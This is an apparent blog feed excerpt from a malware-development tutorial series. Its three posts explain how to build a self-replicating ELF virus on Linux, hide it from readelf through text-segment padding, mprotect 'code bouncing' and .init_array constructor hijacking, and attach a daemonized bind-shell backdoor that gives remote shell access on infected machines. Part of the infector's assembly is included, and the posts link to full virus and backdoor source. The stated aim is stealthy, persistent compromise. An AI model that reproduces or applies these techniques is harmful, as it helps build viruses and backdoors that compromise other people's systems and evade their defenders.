&lt;p&gt;Now that we have made a stealthy infector that is able to infect any ELF binary present on our system, we now have to make it useful. Being able to propagate is a good thing but we want to make something out of it. A backdoor allowing remote access on the infected machine would be a great idea. How do we do that ? This actually quite simple. Here we won&amp;rsquo;t really take care about stealthiness but I might write an article about it at some point. The purpose of this backdoor will be to have an almost-permanent remote access on the machine. For that, we will assume that enough binaries are infected so that when the backdoor is closed, it will be reopened when the infected machine will run a command. I won&amp;rsquo;t show any code for this article but if you want to get a very similar backdoor ASM source code, you can find it &lt;a href=&#34;https://github.com/alagroy-42/Durex&#34;&gt;here&lt;/a&gt; in the Assembly files&lt;/p&gt;
&lt;h2 id=&#34;how-to-run-background-&#34;&gt;How to run background ?&lt;/h2&gt;
&lt;p&gt;First, what we have to do is making sure tht the backdoor will be running in background at any time. For that, we have to launch it via the viral code but we also want to make its execution continue after the virus/command has been executed. We can use the daemonization principle to do that (&lt;code&gt;man 7 daemon&lt;/code&gt;). A daemon is simply a process that runs in background. To make our program a daemon, we will first have to fork to detach from the main process to let it do its thing. Once we have done that, we will fork, make the child the session leader and then fork again without forgetting to kill the parent processes (except for the main thread of course). A last thing to do for our backdoor is to check that there is only one instance running (checking that before daemonizing would be great but it can be done afterwards). To check that the process is not already running, we can use UNIX socket. We will create one in &lt;code&gt;/var/lock&lt;/code&gt; because that is the right place to do it. Once it is created, we can try to connect to it. If we cannot, it means that another instance of the backdoor is running.&lt;/p&gt;
&lt;h2 id=&#34;what-about-rce-&#34;&gt;What about RCE ?&lt;/h2&gt;
&lt;p&gt;We now have the ability to run a single instance of the program in background and make it do what we want so what do we want it to do ? To allow remote code execution, the best solution is to use TCP socket. Those are used to open a port and listen for an incoming connection. Since we want to be able to connect to it, we have to specify the port and not let the system decide about it. That would also work to check that we have a single instance running since we cannot use a port several times unless we modify the socket options but that would not work if we want to make our backdoor a bit fancier and add some functionalities like multi-client handling. The advantage of that is that the &lt;code&gt;listen&lt;/code&gt; syscall will only return once it has received a connection so the backdoor will run indefinitely in background. Once this connection returns, it means a client has connected. Since our backdoor doesn&amp;rsquo;t do any fancy stuff like network traffic encoding for now, we don&amp;rsquo;t have to actually code a client and we can just use the &lt;code&gt;netcat&lt;/code&gt; command. Giving RCE to our new client will be very easy once this one is connected. We will redirect all the standard fds (stdin, stdout and stderr) to the socket using the &lt;code&gt;dup2&lt;/code&gt; syscall and once that is done, we will substitute our process by &lt;code&gt;/bin/sh&lt;/code&gt; using &lt;code&gt;execve&lt;/code&gt;. Do not forget to specify the &lt;code&gt;-i&lt;/code&gt; argument to &lt;code&gt;/bin/sh&lt;/code&gt; to make the process interactive so that the client receives a prompt.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Good job, we made our very simple but also very effective backdoor. I might write another article later about how to make a more evolved backdoor that includes network-traffic encoding, ICMP exfiltration and other fancy features that will make it stealthier. Now that we have a proper malicious payload in our infector, let&amp;rsquo;s imagine that a reverse-engineer wants to try to check it out, it would be great to make its task harder with obfuscation. You can check that &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/obfuscation_techniques&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Advanced infectors: How to make our infector stealthy and hardly detectable</title>
      <link>https://alagroy-42.github.io/malware_dev/infector_advanced/</link>
      <pubDate>Mon, 20 Jun 2022 14:25:16 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/malware_dev/infector_advanced/</guid>
      <description>Introduction In our last post, we saw how to make a simple virus that propagates inside ELF 64-bits files but we saw at the end that the way we did it was not really stealthy and the whole point of a malware is to be stealthy to avoid being spotted and removed. To remedy to that, we will now use a new technique that won&amp;rsquo;t raise any suspicions when the infected binary is being inspected with the readelf command.</description>
      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;In our &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_basics&#34;&gt;last post&lt;/a&gt;, we saw how to make a simple virus that propagates inside ELF 64-bits files but we saw at the end that the way we did it was not really stealthy and the whole point of a malware is to be stealthy to avoid being spotted and removed. To remedy to that, we will now use a new technique that won&amp;rsquo;t raise any suspicions when the infected binary is being inspected with the &lt;code&gt;readelf&lt;/code&gt; command. It means neither the number of segments nor their permissions should be changed and the entrypoint will also remain the same. Since our last post has been really detailed about the code, we will now just see the concepts to write a better virus. If you are interested in the code, I did a virus that implements all of these techniques that you can find &lt;a href=&#34;https://github.com/alagroy-42/Famine&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;how-do-we-do-that-&#34;&gt;How do we do that ?&lt;/h2&gt;
&lt;p&gt;We will break down this problem in two parts, the first one will be finding a place where we can inject ourself and then we will find a way to get control of the execution flow to execute our payload. To avoid changing the number of load segment, since they are the only one that are mapped into memory, we know that we are going to have to put them here. There are two well-known infection techniques that would respect the constraints and that are safe:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The reverse text segment padding&lt;/li&gt;
&lt;li&gt;The text segment padding&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Those techniques are really efficient and simple to implement but they have the major inconvenient that the padding size depends on the file and we might not be able to inject our payload. That&amp;rsquo;s why we will implement a handcrafted technique of mine which is the code bouncing one. We will explain why later but that technique is not optimal so we will only use it as a backup solution if we cannot insert ourself on the text segment padding.&lt;/p&gt;
&lt;h2 id=&#34;the-optimal-solution--the-text-segment-padding&#34;&gt;The optimal solution : the text segment padding&lt;/h2&gt;
&lt;p&gt;The two known techniques evoked above are quite similar in terms of result so I chose the second one which is the &amp;ldquo;normal&amp;rdquo; text segment padding insertion.&lt;/p&gt;
&lt;p&gt;The ELF format has been made so that memory mapping of file parts is being made easy thanks to the congruency between offsets and address, modulo a page size, which is usually 4096 bytes. That being said, since everything on the same page has the same permissions, code and data cannot be on the same page. That would be a disaster for security if data had execution permissions or if we could rewrite the code. To put code and data on different pages while keeping the offsets aligned on the memory, the only solution is to put some padding after the code segment. Those are unused null bytes, that we can replace with our code.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/infector_adv_page.png&#34; alt=&#34;pages&#34;&gt;&lt;/p&gt;
&lt;p&gt;As we can see, if the padding is large enough, we can put our payload inside it and make a few modification to some of the ELF structures to map it inside an executable memory segment which is exactly what we want.
To check that we can put our payload inside the padding we can just compute this formula : &lt;code&gt;padding_size = rodata_phdr.p_off - (text_phdr.p_off + test_phdr.p_filesz)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Once we know that we can infect the file using this technique, we just have to :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;copy the payload in the padding area.&lt;/li&gt;
&lt;li&gt;increase the text segment size so that our payload gets mapped into memory at runtime&lt;/li&gt;
&lt;li&gt;increase the last section of the segment (usually &lt;code&gt;.fini&lt;/code&gt;) so that our payload fit in a section to avoid any suspicion.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now, if everything has been done correctly, the only remaining thing to do is to hijack the execution flow but first let&amp;rsquo;s see whta we can do in case our payload doesn&amp;rsquo;t fit.&lt;/p&gt;
&lt;h2 id=&#34;the-backup-solution--the-code-bouncing&#34;&gt;The backup solution : the code bouncing&lt;/h2&gt;
&lt;p&gt;When we don&amp;rsquo;t have enough place to insert ourselves in the text segment padding, there is still somewhere we can go whatever the size of our payload is : the end of the last segment. Indeed, we can extend it as much as we want to adapt to any payload but the last load segment is usually the data segment which brings two problems:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the BSS : this section used for uninitialized global and static variables is present in memory but not in the file&lt;/li&gt;
&lt;li&gt;the permissions: we said that we don&amp;rsquo;t want to grant any additional permission to our load segments to avoid being spotted with a &lt;code&gt;readelf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;That&amp;rsquo;s where the code bouncing technique comes in.&lt;/p&gt;
&lt;p&gt;First, let&amp;rsquo;s insert our payload in the data segment. As we said earlier, we want to put our code at the end of the last segment which is the data segment. The data segments usually ends with the BSS section. This section is used for uninitialized static and global variables. Since those are not stored on the stack, the program has to store them somewhere writable so in the data segment. However, since those are uninitialized, storing them in the file would be useless and consume unnecessary space. To address that problem, the BSS section has been created and it will only be present in memory. That is why the &lt;code&gt;filesz&lt;/code&gt; and &lt;code&gt;memsz&lt;/code&gt; attributes of the Program Header structure are sometimes different.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/infector_adv_bss.png&#34; alt=&#34;pages&#34;&gt;&lt;/p&gt;
&lt;p&gt;The problem with that situation is that this memory zone used for the BSS is usually zero-filled and it could be used by the program anyway which would result in our payload being overridden like so :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/infector_adv_bss_override.png&#34; alt=&#34;pages&#34;&gt;&lt;/p&gt;
&lt;p&gt;To avoid this problem, we cannot move the BSS after the payload since it would break all the references to the variables present inside. Something we can do though is writing the BSS. It will ensure the integrity of our code while having no effect on the BSS itself. However it means adding some space in the middle of the file, which will break some offsets and potentially some important part of the files like the section header table. Because we do not want that, we will be careful to conserve the file integrity.&lt;/p&gt;
&lt;p&gt;It will mean shifting everything that comes after the BSS before writing it and the payload and once we&amp;rsquo;ve done that, we will update the offsets of every section that follows the BSS and the offset of the section header table in the ELF header. With that done, the file structure will remain the same and nothing should be broke, at least not on the execution point of view because nothing is mapped after the BSS. Since we&amp;rsquo;ve updated the offsets, we can still use &lt;code&gt;readelf -t&lt;/code&gt; to check the sections. Everything should be coherent for now but we have to modify the BSS section header which will bring some little abnormal things to &lt;code&gt;readelf&lt;/code&gt;. We have to change its type to &lt;code&gt;SHT_PROGBITS&lt;/code&gt; instead of &lt;code&gt;SHT_NOBITS&lt;/code&gt; to get it mapped into memory. We also have to update the size of the BSS to include our payload but also the sizes of the data segment without forgetting that it already counted the BSS but only in the &lt;code&gt;p_memsz&lt;/code&gt; field. Once that is done, we have our code placed in memory but on a non-executable segment, which is a problem because we will segfault if we execute it. We cannot change it in the file to avoid being spotted too easily but we can try to change it at runtime. That is what the code bouncing technique is about.&lt;/p&gt;
&lt;p&gt;To resolve our current issue, we will insert a short chunk of code in the text padding segment that will grant the execution permission to the data segment using the &lt;code&gt;mprotect&lt;/code&gt; syscall. Once it has made the data segment executable, it will just jump on it to execute it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/infector_adv_code_bounce.png&#34; alt=&#34;pages&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;what-about-the-execution-flow-&#34;&gt;What about the execution flow ?&lt;/h2&gt;
&lt;p&gt;We achieved our first goal : we have an executable payload mapped into memory no matter its size, the only limit is that the code padding is able to host the code bounce code chunk (≈ 20 bytes). All of that without modifying the number of load segments nor their permissions. There is not any suspicious red flag when looking at the &lt;code&gt;readelf&lt;/code&gt; command on an infected program. For now, our payload is useless though since it is not being executed. Our second task will be executing it without changing the entrypoint.&lt;/p&gt;
&lt;p&gt;To do so, we have to find something that gets executed no matter what but that is not the entrypoint. Have you ever tried to compile a simple Hello World in C and then inspect what is in the binary. If not, you should and you will see that there is actually way more than just the main. There is a lot happening before the main gets executed. But the entrypoint is not even main, it usually points on &lt;code&gt;_start&lt;/code&gt;, a wrapper that will call main with the correct arguments. But before that, the loader is doing a lot, it has to map everything, update the relocation call some initialization functions etc&amp;hellip; If you want to know more what happens before the execution of main you can (and you should) read &lt;a href=&#34;http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html&#34;&gt;this article&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now that we know all of that, we have a pretty good idea about how we can hijack the execution of a program without changing the entrypoint. There are many ways to do it, I have chosen the constructor hijacking solution. Every program usually has a constructor, some have more (usually C++ programs). If you ever wandered in an executable using &lt;code&gt;objdump&lt;/code&gt;, you have probably already seen the &lt;code&gt;frame_dummy&lt;/code&gt; function that is useless to most of the programs but it is there. It is the only constructor for a normal C program. The addresses of the constructors are stored in a function pointer array present in the &lt;code&gt;.init_array&lt;/code&gt; section. The &lt;code&gt;_init&lt;/code&gt; function, called at the very beginning of a program calls each one of this array entries. To get our payload executed, we simply have to override the first entry of this array with the address of our payload. The advantage of this double technique is that both have their starting point at the same place (in the text segment padding) so we don&amp;rsquo;t have to take the payload place into account when we override the address. Now this should work for normal executables but there is still a problem to handle. On PIE executable, the &lt;code&gt;.init_array&lt;/code&gt; entries are in the relocation table (in the &lt;code&gt;.rela.dyn&lt;/code&gt; section) which means that the loader is actually gonna replace their address by the value indicated in the relocation field so we also have to modify the &lt;code&gt;r_addend&lt;/code&gt; field of these to indicate to the program where the function is gonna be once the executable has been mapped in a random place.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Now that all of that is patched, we have a working ELF infector that does not show anything suspicious on the &lt;code&gt;readelf&lt;/code&gt; command and that does not change the entrypoint either. That is a good start for a stealth malware. On our way to stealthiness, we will learn a few more things like code obfuscation or oligomorphism (self-encryption) but first, let&amp;rsquo;s have some fun and &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/simple_backdoor&#34;&gt;let&amp;rsquo;s add a backdoor to our virus to gain remote access on infected computers&lt;/a&gt;.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Infectors: how to make a simple self-replicating program on Linux.</title>
      <link>https://alagroy-42.github.io/malware_dev/infector_basics/</link>
      <pubDate>Mon, 20 Jun 2022 12:11:52 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/malware_dev/infector_basics/</guid>
      <description>Introduction During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple readelf command (We will get more into that later).</description>
      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple &lt;code&gt;readelf&lt;/code&gt; command (We will get more into that later).&lt;/p&gt;
&lt;p&gt;You can check the full source code &lt;a href=&#34;https://github.com/alagroy-42/note_infector&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;how-does-it-work-&#34;&gt;How does it work ?&lt;/h2&gt;
&lt;p&gt;The technique that we will use here is called PT_NOTE segment hijacking. To understand how it works, we first need to understand the ELF format. The first element of an ELF file is the ELF header, it gives us the info we need to understand and read the rest of the file. Then comes the Program Header table, it will describe how the file is being organized. Each program header describes a part of the file, a part can belong to several program headers. Each entry is described by the following C structure (&lt;code&gt;man elf&lt;/code&gt; for more information).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;   p_type;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;   p_flags;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               Elf64_Off  p_offset;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               Elf64_Addr p_vaddr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               Elf64_Addr p_paddr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;   p_filesz;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;   p_memsz;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;   p_align;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           } Elf64_Phdr;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;p_type&lt;/code&gt; field describes what kind of program header it is. There are two types that interests us :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_LOAD: The array element specifies a loadable segment, described by p_filesz and p_memsz. The bytes from the file are mapped to the beginning of the memory segment. If the segment&#39;s memory size p_memsz is larger than the file size p_filesz, the &amp;quot;extra&amp;quot; bytes are defined to hold the value 0 and to follow the segment&#39;s initialized area. The file size may not be larger than the memory size. Loadable segment entries in the program header table appear in ascending order, sorted on the p_vaddr member.&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_NOTE: The array element specifies the location of notes (ElfN_Nhdr).&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;code&gt;PT_LOAD&lt;/code&gt; are being loaded in memory which means that with the right permissions, we can execute the content of it. The &lt;code&gt;PT_NOTE&lt;/code&gt; simply gives the location of notes that are useless for the program during its execution. There should be a &lt;code&gt;PT_NOTE&lt;/code&gt; segment on every binary compiled the usual way. The technique will consists in changing this &lt;code&gt;PT_NOTE&lt;/code&gt; segment to a &lt;code&gt;PT_LOAD&lt;/code&gt; pointing to the end of the file where we will put our code. This way, it will be mapped into memory without altering the file too much and we will be able to execute it.&lt;/p&gt;
&lt;p&gt;To execute it, we will look a bit more at the ELF header structure defined as&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define EI_NIDENT 16
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; e_ident[EI_NIDENT];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_type;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_machine;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;      e_version;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               ElfN_Addr     e_entry;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               ElfN_Off      e_phoff;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               ElfN_Off      e_shoff;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;      e_flags;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_ehsize;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_phentsize;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_phnum;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shentsize;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shnum;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shstrndx;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           } ElfN_Ehdr;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The field that interests us here is &lt;code&gt;e_entry&lt;/code&gt; which will define the entrypoint of our program. If we put our code, the program will execute it and we will just have to transfer the execution back to the original entrypoint so that the program can keep its course.&lt;/p&gt;
&lt;h2 id=&#34;the-code&#34;&gt;The code&lt;/h2&gt;
&lt;h3 id=&#34;filesystem-reading&#34;&gt;Filesystem reading&lt;/h3&gt;
&lt;p&gt;The first thing to do will be finding files to infect. For safety reason and because we don&amp;rsquo;t want to launch our program as root, we will not look for those in &lt;code&gt;/bin&lt;/code&gt; or &lt;code&gt;/usr/bin&lt;/code&gt; but in &lt;code&gt;/tmp/test&lt;/code&gt; and &lt;code&gt;/tmp/test2&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_start:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rbp, rsp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rsp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [rel cwd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, O_DIRECTORY &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; O_RDONLY
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_OPEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp], eax      &lt;span style=&#34;color:#75715e&#34;&gt;; We open and save the fd of the cwd so that we will be able&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;; to chdir back to it after we are don&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [rel dir1] &lt;span style=&#34;color:#75715e&#34;&gt;; /tmp/test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;    readdir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [rel dir2] &lt;span style=&#34;color:#75715e&#34;&gt;; /tmp/test2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;    readdir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_FCHDIR
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;                 &lt;span style=&#34;color:#75715e&#34;&gt;; Back to our initial cwd to not break the executed binary (eg. ls)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     eax, SYS_CLOSE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This code chunk will allow us to call the &lt;code&gt;readdir&lt;/code&gt; function that we will use to run through files in both of the target directories. To use those files then, we want to open them with relative paths to avoid string operations that are a bit painful in ASM so we will use &lt;code&gt;chdir&lt;/code&gt; to open them directly. Our first step to avoid breaking the infected program (eg &lt;code&gt;ls&lt;/code&gt;) will be to open our current working directory to be able to get back to it once the job is done.&lt;/p&gt;
